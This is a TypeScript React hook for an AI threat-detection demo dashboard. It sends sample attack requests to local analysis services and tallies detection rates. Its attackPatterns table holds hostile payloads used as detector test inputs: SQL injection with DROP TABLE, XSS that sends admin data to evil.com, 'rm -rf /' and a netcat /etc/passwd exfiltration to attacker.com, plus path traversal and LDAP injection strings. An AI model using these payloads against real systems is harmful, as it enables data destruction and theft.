import { useState, useEffect, useCallback } from 'react'

interface AttackResult {
  threat_score: number
  threat_type: string
  recommended_action: string
  reasoning: string
  confidence?: number
  processing_time?: number
}

interface AttackMetrics {
  total: number
  blocked: number
  vulnerable: number
  totalTime: number
  totalConfidence: number
  detectionRate: number
  successRate: number
}

interface RealtimeData {
  metrics: {
    unprotected: AttackMetrics
    cloud: AttackMetrics
    local: AttackMetrics
  }
  attackResults: Record<string, Record<string, AttackResult>>
  connectionStatus: 'connected' | 'disconnected' | 'connecting'
}

interface UseRealtimeDashboardOptions {
  websocketUrl?: string
  apiBaseUrls?: {
    unprotected: string
    cloud: string
    local: string
  }
}

export function useRealtimeDashboard(options: UseRealtimeDashboardOptions = {}) {
  const [data, setData] = useState<RealtimeData>({
    metrics: {
      unprotected: { total: 0, blocked: 0, vulnerable: 0, totalTime: 0, totalConfidence: 0, successRate: 0 },
      cloud: { total: 0, blocked: 0, vulnerable: 0, totalTime: 0, totalConfidence: 0, detectionRate: 0 },
      local: { total: 0, blocked: 0, vulnerable: 0, totalTime: 0, totalConfidence: 0, detectionRate: 0 },
    },
    attackResults: {},
    connectionStatus: 'disconnected'
  })

  const [websocket, setWebsocket] = useState<WebSocket | null>(null)

  const defaultOptions = {
    websocketUrl: 'ws://localhost:18002/ws',
    apiBaseUrls: {
      unprotected: 'http://localhost:8000',
      cloud: 'http://localhost:18002',
      local: 'http://localhost:18003'
    },
    ...options
  }

  // WebSocket connection management
  useEffect(() => {
    if (typeof window === 'undefined') return

    const connectWebSocket = () => {
      setData(prev => ({ ...prev, connectionStatus: 'connecting' }))

      try {
        const ws = new WebSocket(defaultOptions.websocketUrl)

        ws.onopen = () => {
          console.log('✅ WebSocket connected to Kong Guard AI service')
          setData(prev => ({ ...prev, connectionStatus: 'connected' }))
          setWebsocket(ws)
        }

        ws.onmessage = (event) => {
          try {
            const message = JSON.parse(event.data)
            handleWebSocketMessage(message)
          } catch (error) {
            console.error('❌ WebSocket message parsing error:', error)
          }
        }

        ws.onclose = () => {
          console.log('🔌 WebSocket connection closed')
          setData(prev => ({ ...prev, connectionStatus: 'disconnected' }))
          setWebsocket(null)

          // Attempt reconnection after 5 seconds
          setTimeout(() => {
            console.log('🔄 Attempting WebSocket reconnection...')
            connectWebSocket()
          }, 5000)
        }

        ws.onerror = (error) => {
          console.error('❌ WebSocket error:', error)
          setData(prev => ({ ...prev, connectionStatus: 'disconnected' }))
        }

      } catch (error) {
        console.error('❌ WebSocket connection failed:', error)
        setData(prev => ({ ...prev, connectionStatus: 'disconnected' }))
      }
    }

    connectWebSocket()

    return () => {
      if (websocket) {
        websocket.close()
      }
    }
  }, [])

  const handleWebSocketMessage = useCallback((message: any) => {
    console.log('📨 WebSocket message:', message)

    switch (message.type) {
      case 'connection':
        console.log('✅ Connection established:', message.message)
        if (message.metrics) {
          console.log('📊 Initial metrics:', message.metrics)
        }
        break

      case 'ai_thinking':
        console.log('🤔 AI processing:', message.data)
        break

      case 'threat_analysis':
        console.log('🔍 Threat analysis received:', message.data)
        if (message.metrics) {
          console.log('📊 Updated metrics:', message.metrics)
        }
        break

      case 'attack_flood_started':
        console.log('🚀 Attack flood started:', message)
        break

      case 'attack_flood_progress':
        console.log('📊 Attack flood progress:', message)
        break

      case 'attack_flood_completed':
        console.log('✅ Attack flood completed:', message)
        break

      case 'attack_metric':
        handleAttackMetric(message.metric)
        break

      case 'tier_statistics':
        console.log('📈 Tier statistics update:', message.stats)
        break

      default:
        console.log('🔍 Unknown WebSocket message type:', message.type)
    }
  }, [])

  const handleAttackMetric = useCallback((metric: any) => {
    // Update metrics based on incoming data
    const tier = metric.tier || 'unknown'

    setData(prev => {
      const newMetrics = { ...prev.metrics }
      const tierMetrics = newMetrics[tier as keyof typeof newMetrics]

      if (tierMetrics) {
        tierMetrics.total++
        tierMetrics.totalTime += metric.response_time_ms || 0

        if (metric.blocked) {
          tierMetrics.blocked++
        }

        if (tier === 'unprotected' && !metric.blocked) {
          tierMetrics.vulnerable++
        }

        // Calculate rates
        if (tier === 'unprotected') {
          tierMetrics.successRate = ((tierMetrics.total - tierMetrics.vulnerable) / tierMetrics.total) * 100
        } else {
          tierMetrics.detectionRate = (tierMetrics.blocked / tierMetrics.total) * 100
        }
      }

      return {
        ...prev,
        metrics: newMetrics
      }
    })
  }, [])

  // API methods for testing attacks
  const testAttack = useCallback(async (attackType: string, tier: string): Promise<AttackResult> => {
    const apiUrl = defaultOptions.apiBaseUrls[tier as keyof typeof defaultOptions.apiBaseUrls]

    try {
      if (tier === 'unprotected') {
        // Simulate unprotected response (always allows)
        await new Promise(resolve => setTimeout(resolve, 2))
        const result: AttackResult = {
          threat_score: 0.0,
          threat_type: "none",
          recommended_action: "allow",
          reasoning: "No protection - request passed through unchanged",
          processing_time: 2
        }

        updateAttackResult(attackType, tier, result)
        return result
      } else {
        // Make actual API call to Kong Guard AI service
        const attackPatterns: Record<string, any> = {
          sql: {
            method: "GET",
            path: "/api/users",
            query: "id=1' OR '1'='1; DROP TABLE users;--",
            body: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--"
          },
          xss: {
            method: "POST",
            path: "/comment",
            query: "<script>alert('XSS');</script>",
            body: "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('//evil.com/?'+btoa(d)))</script>"
          },
          cmd_injection: {
            method: "POST",
            path: "/api/ping",
            query: "ping=127.0.0.1; rm -rf / #",
            body: "; cat /etc/passwd | nc attacker.com 4444 &"
          },
          path: {
            method: "GET",
            path: "/download",
            query: "file=../../../../etc/passwd",
            body: ""
          },
          ldap_injection: {
            method: "POST",
            path: "/auth/ldap",
            query: "user=admin')(&(password=*)",
            body: "admin')(&(password=*)(|(objectClass=*)"
          },
          business_logic: {
            method: "POST",
            path: "/api/transfer",
            query: "amount=-999999&to_account=attacker",
            body: '{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}'
          },
          ransomware: {
            method: "POST",
            path: "/api/callback",
            query: "host_id=VICTIM-001&status=encrypted",
            body: '{"victim_id": "BANK-001", "encryption_complete": true, "btc_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "ransom_amount": "50000000"}'
          },
          normal: {
            method: "GET",
            path: "/api/products",
            query: "page=1&limit=10&sort=date",
            body: ""
          }
        }

        const attack = attackPatterns[attackType] || attackPatterns.normal

        const response = await fetch(`${apiUrl}/analyze`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            features: {
              method: attack.method,
              path: attack.path,
              client_ip: '203.0.113.100',
              user_agent: 'KongGuardDashboard/1.0',
              requests_per_minute: 10,
              content_length: (attack.body || attack.query || '').length,
              query_param_count: 1,
              header_count: 3,
              hour_of_day: new Date().getHours(),
              query: attack.query,
              body: attack.body || "",
              headers: {}
            },
            context: { previous_requests: 0 }
          })
        })

        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`)
        }

        const result = await response.json()
        updateAttackResult(attackType, tier, result)
        return result
      }
    } catch (error) {
      console.error(`Attack test failed for ${tier}:`, error)

      // Return mock result on error
      const mockResult: AttackResult = {
        threat_score: tier === 'unprotected' ? 0.0 : Math.random() * 0.9 + 0.1,
        threat_type: tier === 'unprotected' ? 'none' : attackType,
        recommended_action: tier === 'unprotected' ? 'allow' : (Math.random() > 0.3 ? 'block' : 'monitor'),
        reasoning: `Simulated response (service unavailable): ${error instanceof Error ? error.message : 'Unknown error'}`,
        confidence: tier === 'unprotected' ? 0 : Math.random(),
        processing_time: tier === 'unprotected' ? 2 : (tier === 'local' ? 45 : 250) + Math.random() * 50
      }

      updateAttackResult(attackType, tier, mockResult)
      return mockResult
    }
  }, [defaultOptions.apiBaseUrls])

  const updateAttackResult = useCallback((attackType: string, tier: string, result: AttackResult) => {
    setData(prev => ({
      ...prev,
      attackResults: {
        ...prev.attackResults,
        [attackType]: {
          ...prev.attackResults[attackType],
          [tier]: result
        }
      }
    }))

    // Update metrics
    setData(prev => {
      const newMetrics = { ...prev.metrics }
      const tierMetrics = newMetrics[tier as keyof typeof newMetrics]

      if (tierMetrics) {
        tierMetrics.total++
        tierMetrics.totalTime += result.processing_time || 0

        if (result.confidence) {
          tierMetrics.totalConfidence += result.confidence
        } else if (result.threat_score !== undefined) {
          tierMetrics.totalConfidence += result.threat_score
        }

        if (result.threat_score >= 0.7) {
          tierMetrics.blocked++
        } else if (tier === 'unprotected' && result.threat_score === 0) {
          tierMetrics.vulnerable++
        }

        // Calculate rates
        if (tier === 'unprotected') {
          tierMetrics.successRate = ((tierMetrics.total - tierMetrics.vulnerable) / tierMetrics.total) * 100
        } else {
          tierMetrics.detectionRate = (tierMetrics.blocked / tierMetrics.total) * 100
        }
      }

      return {
        ...prev,
        metrics: newMetrics
      }
    })
  }, [])

  // Attack flood control
  const launchAttackFlood = useCallback(async (config: {
    intensity: string
    strategy: string
    duration: number
    targets: string[]
  }) => {
    try {
      const response = await fetch(`${defaultOptions.apiBaseUrls.cloud}/api/attack/flood`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...config,
          record_metrics: true
        })
      })

      if (!response.ok) {
        throw new Error(`Attack flood failed: ${response.statusText}`)
      }

      return await response.json()
    } catch (error) {
      console.error('Attack flood failed:', error)
      throw error
    }
  }, [defaultOptions.apiBaseUrls.cloud])

  return {
    data,
    testAttack,
    launchAttackFlood,
    isConnected: data.connectionStatus === 'connected'
  }
}
